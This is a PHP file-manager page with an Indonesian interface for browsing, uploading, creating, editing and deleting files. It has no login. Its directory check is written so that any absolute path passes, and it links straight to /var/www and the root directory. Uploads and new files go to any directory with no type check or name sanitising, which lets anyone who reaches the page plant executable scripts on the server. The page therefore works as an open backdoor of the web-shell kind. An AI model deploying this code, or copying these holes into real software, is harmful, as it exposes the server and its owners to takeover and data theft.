<?php
function fmt_size($bytes) {
    if ($bytes < 1024) return $bytes . 'B';
    if ($bytes < 1048576) return number_format($bytes/1024, 1) . 'KB';
    return number_format($bytes/1048576, 1) . 'MB';
}
session_start();
$base = __DIR__ . '/files';
$root = isset($_GET['dir']) ? realpath($_GET['dir']) : $base;
if (!$root || (strpos($root, realpath($base)) !== 0 && strpos($root, '/var/www') !== 0 && strpos($root, '/') !== 0 && $root !== '/')) {
    $root = $base;
}
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $target = $root . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $msg = '<div class="msg ok">File uploaded</div>';
        } else {
            $msg = '<div class="msg err">Upload failed</div>';
        }
    }
    if (isset($_POST['newfolder'])) {
        $name = trim($_POST['newfolder']);
        if ($name) { mkdir($root . '/' . $name, 0755, true); $msg = '<div class="msg ok">Folder created</div>'; }
    }
    if (isset($_POST['newfile'])) {
        $name = trim($_POST['newfile']);
        if ($name) { file_put_contents($root . '/' . $name, ''); $msg = '<div class="msg ok">File created</div>'; }
    }
}
if (isset($_GET['delete'])) {
    $del = realpath($root . '/' . basename($_GET['delete']));
    if ($del && strpos($del, realpath($base)) === 0) {
        is_dir($del) ? rmdir($del) : unlink($del);
        header('Location: ?dir=' . urlencode($root)); exit;
    }
}
if (isset($_POST['save']) && isset($_POST['content'])) {
    $f = realpath($root . '/' . basename($_POST['file']));
    if ($f && strpos($f, realpath($base)) === 0) {
        file_put_contents($f, $_POST['content']);
        $msg = '<div class="msg ok">File saved</div>';
    }
}
$items = [];
if (is_dir($root)) {
    $d = dir($root);
    while (($e = $d->read()) !== false) {
        if ($e[0] === '.') continue;
        $p = $root . '/' . $e;
        $items[] = ['name' => $e, 'path' => $p, 'is_dir' => is_dir($p), 'size' => is_file($p) ? filesize($p) : 0, 'perm' => substr(sprintf('%o', fileperms($p)), -4), 'mtime' => date('Y-m-d H:i', filemtime($p))];
    }
    $d->close();
}
usort($items, function($a, $b) { return ($b['is_dir'] - $a['is_dir']) ?: strcasecmp($a['name'], $b['name']); });
$edit_file = '';
$edit_content = '';
if (isset($_GET['edit'])) {
    $ef = realpath($root . '/' . basename($_GET['edit']));
    if ($ef && is_file($ef) && strpos($ef, realpath($base)) === 0) {
        $edit_file = basename($ef);
        $edit_content = htmlspecialchars(file_get_contents($ef));
    }
}
?>
<!DOCTYPE html><html lang="id"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>File Manager</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#0f0f1a;color:#eee;min-height:100vh}
.top{background:#1a1a2e;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333}
.top h1{color:#e94560;font-size:1.2em}.top a{color:#4ecca3;text-decoration:none;font-size:.85em}
.container{max-width:1200px;margin:0 auto;padding:15px}
.msg{padding:8px 12px;border-radius:6px;margin-bottom:10px;font-size:.9em}
.msg.ok{background:#1a3a2a;color:#4ecca3}.msg.err{background:#3a1a1a;color:#e94560}
.breadcrumb{background:#1a1a2e;padding:10px 15px;border-radius:8px;margin-bottom:15px;font-size:.85em;word-break:break-all}
.breadcrumb a{color:#4ecca3;text-decoration:none}.breadcrumb span{color:#888}
.toolbar{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}
.toolbar form{display:flex;gap:5px;align-items:center}
.toolbar input{padding:6px 10px;border:1px solid #333;border-radius:4px;background:#1a1a2e;color:#eee;font-size:.85em}
.toolbar button{padding:6px 12px;border:none;border-radius:4px;cursor:pointer;font-size:.85em;transition:.2s}
.btn-up{background:#4ecca3;color:#000}.btn-folder{background:#ffc107;color:#000}.btn-file{background:#0f3460;color:#fff}
table{width:100%;border-collapse:collapse;background:#1a1a2e;border-radius:8px;overflow:hidden}
th{background:#16213e;padding:10px 12px;text-align:left;font-size:.8em;color:#888;text-transform:uppercase}
td{padding:8px 12px;border-top:1px solid #2a2a3e;font-size:.9em}
tr:hover{background:#1e1e3a}td a{color:#eee;text-decoration:none}td a:hover{color:#e94560}
.folder-icon{color:#ffc107;margin-right:6px}.file-icon{color:#888;margin-right:6px}
.actions a{color:#e94560;text-decoration:none;margin:0 3px;font-size:.85em}.actions a:hover{text-decoration:underline}
.size{color:#888;font-size:.85em}.date{color:#888;font-size:.85em}.perm{color:#555;font-size:.8em;font-family:monospace}
.editor{margin-top:15px;background:#1a1a2e;border-radius:8px;padding:15px;border:1px solid #2a2a3e}
.editor h3{color:#e94560;margin-bottom:10px}
.editor textarea{width:100%;min-height:400px;background:#0f0f1a;color:#4ecca3;border:1px solid #333;border-radius:4px;padding:10px;font-family:monospace;font-size:.9em;resize:vertical}
.editor .btn-save{background:#e94560;color:#fff;padding:8px 20px;border:none;border-radius:4px;cursor:pointer;margin-top:8px}
.shortcuts{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}
.shortcuts a{padding:6px 14px;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:20px;color:#eee;text-decoration:none;font-size:.8em;transition:.3s}
.shortcuts a:hover{border-color:#e94560;background:#e94560;color:#fff}
.shortcuts a.root-link{background:#3a1a1a;border-color:#e94560}
</style></head><body>
<div class="top">
<h1>&#128193; File Manager</h1>
<div><a href="?dir=<?=urlencode($base)?>">&#128193; Home</a> | <a href="/">&#127968; Landing</a></div>
</div>
<div class="container">
<?=$msg?>
<div class="shortcuts">
<a href="?dir=<?=urlencode($base)?>">&#128193; My Files</a>
<a href="?dir=<?=urlencode($base)?>/My%20Document">&#128196; My Document</a>
<a href="?dir=<?=urlencode($base)?>/My%20Music">&#127925; My Music</a>
<a href="?dir=<?=urlencode($base)?>/My%20Pictures">&#128444; My Pictures</a>
<a href="?dir=<?=urlencode($base)?>/My%20Video">&#127916; My Video</a>
<a href="?dir=/var/www" class="root-link">&#127760; var/www</a>
<a href="?dir=/" class="root-link">&#128308; Root (/)</a>
</div>
<div class="breadcrumb">
<?php
$crumbs = explode('/', trim(str_replace(realpath($base), 'My Files', $root), '/'));
$path = '';
echo '<a href="?dir=' . urlencode($base) . '">&#128193; My Files</a>';
foreach ($crumbs as $c) {
    if (!$c) continue;
    $path .= '/' . $c;
    if (realpath($root) === realpath($base . $path) || realpath($root) === realpath($path)) {
        echo ' / <span>' . htmlspecialchars($c) . '</span>';
    } else {
        echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($c) . '</a>';
    }
}
?>
</div>
<div class="toolbar">
<form method="post" enctype="multipart/form-data"><input type="file" name="file" required><button type="submit" class="btn-up">Upload</button></form>
<form method="post"><input type="text" name="newfolder" placeholder="folder baru" required><button type="submit" class="btn-folder">+ Folder</button></form>
<form method="post"><input type="text" name="newfile" placeholder="file baru" required><button type="submit" class="btn-file">+ File</button></form>
</div>
<table>
<tr><th>Nama</th><th>Ukuran</th><th>Tanggal</th><th>Izin</th><th>Aksi</th></tr>
<?php if ($root !== '/' && dirname($root) !== $root): ?>
<tr><td colspan="5"><a href="?dir=<?=urlencode(dirname($root))?>" style="color:#4ecca3">&#11014; Kembali</a></td></tr>
<?php endif; ?>
<?php foreach ($items as $item): ?>
<tr>
<td><?php if ($item['is_dir']): ?><a href="?dir=<?=urlencode($item['path'])?>" class="folder-icon">&#128193; <?=htmlspecialchars($item['name'])?></a>
<?php else: ?><span class="file-icon">&#128196;</span> <a href="?dir=<?=urlencode($root)?>&edit=<?=urlencode($item['name'])?>"><?=htmlspecialchars($item['name'])?></a><?php endif; ?></td>
<td class="size"><?=$item['is_dir']?'-':fmt_size($item['size'])?></td>
<td class="date"><?=$item['mtime']?></td>
<td class="perm"><?=$item['perm']?></td>
<td class="actions">
<?php if (!$item['is_dir']): ?><a href="?dir=<?=urlencode($root)?>&edit=<?=urlencode($item['name'])?>">&#9998; Edit</a><?php endif; ?>
<a href="?dir=<?=urlencode($root)?>&delete=<?=urlencode($item['name'])?>" onclick="return confirm('Hapus <?=htmlspecialchars($item['name'])?>?')">&#128465; Hapus</a>
</td>
</tr>
<?php endforeach; ?>
</table>
<?php if ($edit_file): ?>
<div class="editor">
<h3>&#9998; Edit: <?=htmlspecialchars($edit_file)?></h3>
<form method="post">
<input type="hidden" name="file" value="<?=htmlspecialchars($edit_file)?>">
<textarea name="content"><?=$edit_content?></textarea>
<button type="submit" name="save" class="btn-save">&#128190; Simpan</button>
</form>
</div>
<?php endif; ?>
</div>
</body></html>
